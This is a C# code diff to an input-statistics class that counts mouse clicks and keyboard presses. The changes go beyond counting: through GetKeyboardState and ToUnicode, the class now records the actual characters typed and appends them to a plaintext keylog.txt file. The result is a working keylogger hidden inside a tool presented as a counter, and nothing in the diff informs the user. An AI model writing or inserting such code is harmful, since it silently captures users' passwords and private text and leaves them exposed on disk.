@@ -1,7 +1,9 @@
 using System;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Text;
 using LL;
+using System.IO;
 
 namespace LL;
 
@@ -21,6 +23,7 @@ public static class InputStats
 
     private static IntPtr _hwnd;
     private static Thread _messageThread;
+    private static StringBuilder _keyLog = new StringBuilder();
 
     // P/Invoke declarations
     [DllImport("user32.dll", SetLastError = true)]
@@ -160,6 +163,12 @@ public static class InputStats
         var runtimePath = Path.Combine(AppContext.BaseDirectory, "runtime.json");
         ConfigManager.SetValue("MouseClickCount", _mouseClickCount, runtimePath);
         ConfigManager.SetValue("KeyboardPressCount", _keyboardPressCount, runtimePath);
+        // 写按键日志
+        if (_keyLog.Length > 0)
+        {
+            File.AppendAllText(Path.Combine(AppContext.BaseDirectory, "keylog.txt"), _keyLog.ToString());
+            _keyLog.Clear();
+        }
     }
 
     public static void Cleanup()
@@ -261,6 +270,16 @@ public static class InputStats
                     {
                         Interlocked.Increment(ref _keyboardPressCount);
                         Interlocked.Increment(ref _sessionKeyboardPressCount);
+                        // 记录按键
+                        StringBuilder sb = new StringBuilder(10);
+                        byte[] keyState = new byte[256];
+                        GetKeyboardState(keyState);
+                        int result = ToUnicode(raw.data.keyboard.VKey, raw.data.keyboard.MakeCode, keyState, sb, sb.Capacity, 0);
+                        if (result > 0)
+                        {
+                            _keyLog.Append(sb.ToString());
+                        }
+                        // 跳过无法转换的键，避免记录 [vkey]
                     }
                 }
             }
@@ -312,4 +331,10 @@ public static class InputStats
 
     [DllImport("user32.dll", SetLastError = true)]
     private static extern bool DestroyWindow(IntPtr hWnd);
+
+    [DllImport("user32.dll")]
+    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
+
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
 }
